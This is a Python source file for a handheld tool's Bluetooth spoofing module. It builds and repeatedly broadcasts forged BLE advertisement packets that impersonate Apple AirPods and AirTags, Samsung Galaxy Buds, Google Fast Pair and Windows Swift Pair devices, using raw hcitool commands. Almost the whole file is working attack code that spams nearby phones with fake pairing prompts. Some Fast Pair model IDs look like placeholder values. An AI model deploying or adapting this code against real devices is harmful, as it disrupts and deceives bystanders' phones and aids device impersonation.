#!/usr/bin/env python3
# tools/bt/bt_spoofing.py

import subprocess
import time
import os
import random
import threading
import sys

try:
    from display.screen import MenuDisplay
    from config.gpio_config import read_buttons
except ImportError:
    class MenuDisplay:
        def show_message(self, lines, center=False):
            print("\n".join(lines))
    def read_buttons():
        return {"enter": False}

FASTPAIR_MODELS = [
    b"\x00\x00\x01", b"\x00\x00\x02", b"\x00\x00\x03", b"\x00\x00\x04",
    b"\x00\x00\x05", b"\x00\x00\x06", b"\x00\x00\x07", b"\x00\x00\x08",
    b"\x2C\xDE\xAD", b"\xAA\xBB\xCC", b"\x11\x22\x33", b"\xDD\xEE\xFF",
    b"\x12\x34\x56", b"\x78\x9A\xBC", b"\xDE\xAD\xBE", b"\xEF\x01\x23",
]

APPLE_DEVICES = [
    (b"\x01\x01\x20", "AirPods"),
    (b"\x01\x02\x20", "AirPods Pro"),
    (b"\x01\x03\x20", "AirPods Max"),
    (b"\x01\x04\x20", "AirPods 3"),
    (b"\x01\x05\x20", "Beats Fit Pro"),
    (b"\x01\x06\x20", "Beats Solo"),
    (b"\x01\x07\x20", "Beats Studio"),
    (b"\x01\x08\x20", "PowerBeats"),
    (b"\x01\x09\x20", "Beats X"),
    (b"\x01\x0A\x20", "AirPods Pro 2"),
    (b"\x03\x01\x20", "AirTag"),
    (b"\x05\x01\x20", "HomePod"),
    (b"\x06\x01\x20", "AppleTV"),
]

SAMSUNG_MODELS = [
    (b"\x01\x00\x02\x01", "Galaxy Buds"),
    (b"\x01\x00\x02\x02", "Galaxy Buds Pro"),
    (b"\x01\x00\x02\x03", "Galaxy Buds 2"),
    (b"\x01\x00\x02\x04", "Galaxy Buds Live"),
    (b"\x01\x00\x02\x05", "Galaxy Buds 2 Pro"),
]


SWIFT_PAIR_NAMES = ["Galaxy Buds", "Moto Buds 250", "Beats Solo3", "Xiaomi Buds 5", "Earbuds", "Airpods Pro"]

lock = threading.Lock()
packets_sent = 0
last_device = ""
last_error = ""
stop_flag = False

def run_cmd(cmd_list, timeout=5):
    try:
        proc = subprocess.run(cmd_list, capture_output=True, text=True, timeout=timeout, check=False)
        return proc.returncode, proc.stdout.strip(), proc.stderr.strip()
    except subprocess.TimeoutExpired:
        return -1, "", "Timeout"
    except Exception as e:
        return -1, "", str(e)

def _hci_up():
    run_cmd(["sudo", "hciconfig", "hci0", "up"])

def _hci_set_adv_params():
    cmd = [
        "sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0006",
        "A0", "00", "A0", "00", "03", "00", "00",
        "00", "00", "00", "00", "00", "00", "07", "00"
    ]
    run_cmd(cmd)

def _hci_disable_adv():
    run_cmd(["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "00"])

def _hci_enable_adv():
    run_cmd(["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x000a", "01"])

def _hci_set_adv_data(adv_bytes):
    length = len(adv_bytes)
    if length > 31:
        return False, "Data too long"
    
    hex_str = f"{length:02X} " + " ".join(f"{b:02X}" for b in adv_bytes)
    cmd_list = ["sudo", "hcitool", "-i", "hci0", "cmd", "0x08", "0x0008"] + hex_str.split()
    
    rc, out, err = run_cmd(cmd_list)
    if rc != 0:
        return False, err or out
    return True, ""

def _broadcast_once(adv_bytes, label):

    global packets_sent, last_device, last_error
    
    try:
        _hci_disable_adv()
        time.sleep(0.08) 
        
        ok, err = _hci_set_adv_data(adv_bytes)
        if not ok:
            with lock:
                last_error = err[:30]
            return False
            
        _hci_enable_adv()
        
        with lock:
            packets_sent += 1
            last_device = label
        
        time.sleep(0.2) 
        _hci_disable_adv()
        
        return True
    except Exception as e:
        with lock:
            last_error = str(e)[:30]
        return False

def _build_fastpair_adv():
    model = random.choice(FASTPAIR_MODELS)
    adv = bytearray([
        0x02, 0x01, 0x06,        
        0x06, 0x16,                 
        0x2C, 0xFE,                 
    ])
    adv.extend(model)
    return bytes(adv), f"FP:{model.hex()}"

def _build_ios_adv():
    device_bytes, name = random.choice(APPLE_DEVICES)
    status = random.randint(0x00, 0xFF)
    adv = bytearray([
        0x02, 0x01, 0x06,         
        0x07, 0xFF,               
        0x4C, 0x00,             
        0x07,                     
        status,
    ])
    adv.extend(device_bytes)
    return bytes(adv), name

def _build_samsung_adv():
    model_bytes, name = random.choice(SAMSUNG_MODELS)
    adv = bytearray([
        0x02, 0x01, 0x06,        
        0x08, 0xFF,                
        0x75, 0x00,              
    ])
    adv.extend(model_bytes)
    adv.append(random.randint(0x00, 0xFF))
    adv[0] = len(adv) - 1
    return bytes(adv), name

def _build_swiftpair_adv():
    name = random.choice(SWIFT_PAIR_NAMES)
    rssi = random.randint(0xC0, 0xFF)
    name_bytes = name.encode("utf-8")[:8]
    data_len = 4 + len(name_bytes)
    adv = bytearray([
        0x02, 0x01, 0x06,       
        data_len, 0xFF,            
        0x06, 0x00,               
        0x03,                  
        rssi,
    ])
    adv.extend(name_bytes)
    return bytes(adv), f"SP:{name}"

def has_command(cmd):
    return subprocess.call(["which", cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0

def run_bt_spoofing(name=None, mac=None, rssi=None):
    global stop_flag, packets_sent, last_device, last_error
    
    display = MenuDisplay()
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    
    bt_reports = os.path.abspath(os.path.join(os.path.dirname(__file__), "/opt/beetle/reports/bt"))
    os.makedirs(bt_reports, exist_ok=True)
    logfile = os.path.join(bt_reports, f"advertise_{timestamp}.log")

    adv_name = name or "Device"
    display.show_message(["Inicializando HCI", adv_name], center=True)
    time.sleep(0.8)

    use_hci = has_command("hcitool") and has_command("hciconfig")
    if not use_hci:
        display.show_message(["Error: hcitool no encontrado"], center=True)
        time.sleep(0.8)
        return

    display.show_message(["Configurando Stack", "HCI Up & Params"], center=True)
    _hci_up()
    _hci_set_adv_params()
    time.sleep(0.5)

    display.show_message([f"Spoofing:", f"{adv_name}", "", "ENTER: Stop"], center=True)
    
    start = time.time()
    duration_total = 120 
    stop_flag = False
    packets_sent = 0
    last_device = ""
    last_error = ""
    
    builders = [
        (_build_ios_adv, "APPLE"),
        (_build_samsung_adv, "SAMSUNG"),
        (_build_fastpair_adv, "GOOGLE"),
        (_build_swiftpair_adv, "WINDOWS"),
    ]

    with open(logfile, "w") as logf:
        try:
            idx = 0
            while True:
                elapsed = int(time.time() - start)
                remaining = max(0, duration_total - elapsed)
                
                buttons = read_buttons()
                if buttons.get("enter", False) or remaining <= 0 or stop_flag:
                    break

                builder_func, label = builders[idx % len(builders)]
                idx += 1
                
                adv_bytes, device_label = builder_func()
                success = _broadcast_once(adv_bytes, device_label)
                
                if success:
                    logf.write(f"[{time.strftime('%H:%M:%S')}] OK: {device_label}\n")
                else:
                    logf.write(f"[{time.strftime('%H:%M:%S')}] ERR: {last_error}\n")

                with lock:
                    disp_dev = last_device if last_device else device_label
                    disp_err = last_error if last_error else ""
                
                msg_lines = [
                    f"{adv_name}",
                    f"Type: {label}",
                    f"Pkt: {packets_sent}",
                    f"Left: {remaining}s"
                ]
                if disp_err:
                    msg_lines.append(f"Err: {disp_err[:15]}")
                
                display.show_message(msg_lines, center=False)
                time.sleep(0.5)

        except KeyboardInterrupt:
            stop_flag = True
        finally:
            _hci_disable_adv()
            display.show_message(["   Spoofing Detenido   ", f"Pkts: {packets_sent}"], center=True)
            time.sleep(0.8)
